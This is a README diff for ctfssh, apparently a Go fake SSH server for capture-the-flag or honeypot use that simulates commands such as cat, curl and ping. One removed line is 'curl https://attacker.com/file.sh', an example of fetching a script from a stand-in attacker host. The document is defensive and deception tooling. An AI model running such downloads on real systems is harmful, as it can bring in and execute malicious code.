@@ -81,14 +81,17 @@ Run the Server
 ./ctfssh --port 2222 --hostkey host_key --users users.json --banner "SSH-2.0-CTFssh"
 ```
 
-Simulated Commands
 
+### Simulated Commands
+
+```
 cat /proc/cpuinfo
-curl https://attacker.com/file.sh
+curl https://<url.....>
 ping 8.8.8.8
 w, last, uname, uptime, ls, id
+```
 
-Security & Safety
+### Security & Safety
 
 All commands are isolated and non-destructive
 Inputs are parsed and sanitized
@@ -98,20 +101,24 @@ Can safely be run on port 22 using setcap or iptables redirect
 
 
 
-Flag	Description
---port	Port to listen on
---hostkey	Path to SSH private key
---users	Path to user config JSON
---banner	SSH version banner string
+### Flag	Description
+
+* --port	Port to listen on
+* --hostkey	Path to SSH private key
+* --users	Path to user config JSON
+* --banner	SSH version banner string
 
 Example Commands in command/
 
 cat → fake /proc and /etc reads
+
 curl, wget → logs URLs and mimics download
+
 ping → fake ICMP responses
+
 w, last → fake session reports
 
-Deployment
+### Deployment
 
 Use make build or:
 ```bash
@@ -120,6 +127,6 @@ go build -o ctfssh main.go users.go commands.go hostkey.go ratelimit.go
 
 Use authbind, iptables, or setcap to bind to port 22 as non-root.
 
-License
+### License
 MIT
 
